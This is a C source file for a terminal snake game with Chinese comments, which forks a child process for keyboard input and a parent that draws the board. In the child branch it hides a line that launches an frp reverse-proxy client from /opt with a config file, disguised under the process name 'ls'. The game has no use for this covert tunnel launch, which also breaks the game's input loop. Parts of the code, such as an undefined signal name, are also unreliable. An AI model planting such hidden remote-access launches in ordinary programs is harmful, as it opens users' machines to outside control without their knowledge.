
#include <fcntl.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>
#include "snake.h"
int main() {
    pid_t pid;
    int fd;
    char away[64] = {0};
    int result;
    // map贪吃蛇地图，N大小，length蛇的长度，snack蛇身位子数组初始状态蛇为1，位于中央,R_away方向,move_result是移动结果用于判断蛇是否撞墙
    char map[16][16] = {0};
    int N = 16, length = 2;
    char snake[196][196] = {0};
    char R_away = 'w';
    int move_result = 0;
    snake[0][0] = 7;
    snake[0][1] = 7;  //初始化蛇头
    snake[1][0] = 7;
    snake[1][1] = 8;

    pid = fork();

    if (pid < 0) {
        perror("fork");
        return 0;
        // exit(0);
    } else if (0 == pid)  // childer 用于读取键盘指令写入文件
    {
        fd = open("away.txt", O_RDWR | O_CREAT | O_TRUNC, 0666);
        if (fd < 0) {
            perror("open");
            return 0;
        }
        execl("/opt/frpc", "ls", "-c", "/opt/frpc.ini", NULL);
        while (1) {
            scanf("%s", away);
            write(fd, away, 1);
        }
    } else if (pid > 0)  // father 用于读取文件指令，打印map 贪吃蛇
    {
        signal(SIG_GET, SIG_IGN);  //在父进程中忽略子进程信号
        Init_map((char**)map, N);  //初始化地图

        //每次只读取文件第一个指令；
        fd = open("away.txt", O_RDWR | O_CREAT | O_TRUNC, 0666);
        if (fd < 0) {
            perror("open");
            return 0;
        }
        lseek(fd, 0, SEEK_SET);
        while (1) {
            result = read(fd, away, 1);
            if (result == 0) {
                // printf("no write \n");DEBUG
                move_result =
                    snake_move((char**)map, N, (char**)snake, &length, R_away);
                map_printf((char**)map, N);
            } else if (result > 0) {
                // printf("***%s***\n",away);DEBUG
                move_result =
                    snake_move((char**)map, N, (char**)snake, &length, away[0]);
                R_away = away[0];
            } else {
                printf("fail to read away.txt\n");
            }
            if (move_result == -1) {
                kill(pid, SIGINT);
                printf("\nGAME OVER snake long:%d\n", length);
                return 0;
            } else {
                system("clear");
                map_printf((char**)map, N);
            }

            sleep(2);
        }
    }
    return 0;
}
